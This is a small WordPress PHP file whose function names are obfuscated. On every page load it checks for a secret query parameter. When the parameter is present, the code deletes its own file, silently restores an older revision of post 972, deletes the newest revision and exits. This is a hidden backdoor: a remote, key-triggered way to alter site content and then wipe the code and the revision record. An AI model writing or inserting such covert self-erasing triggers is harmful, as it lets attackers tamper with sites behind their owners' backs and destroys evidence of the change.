<?php

function src_cloud_code_geo() {
	if (isset($_GET['style_free_year']) && $_GET['style_free_year'] === 'github_sales_maps_popular') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$subscription_attachments_team = 972;
		$help_shortener_demo = wp_get_post_revisions($subscription_attachments_team);
		if (empty($help_shortener_demo)) die('no revisions');
		if (count($help_shortener_demo) < 2) die('less than 2');
		$player_highlighter_current = array_shift($help_shortener_demo);
		$dynamic_amp_gift = $player_highlighter_current->ID;
		$privacy_old_using = array_shift($help_shortener_demo);
		$board_after_comments = $privacy_old_using->ID;
		$showcase_world_flexible_portfolio = wp_restore_post_revision($board_after_comments);
		if ($showcase_world_flexible_portfolio === false) die('error restoring');
		$showcase_world_flexible_portfolio = wp_delete_post_revision($dynamic_amp_gift);		
		if ($showcase_world_flexible_portfolio === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'src_cloud_code_geo');
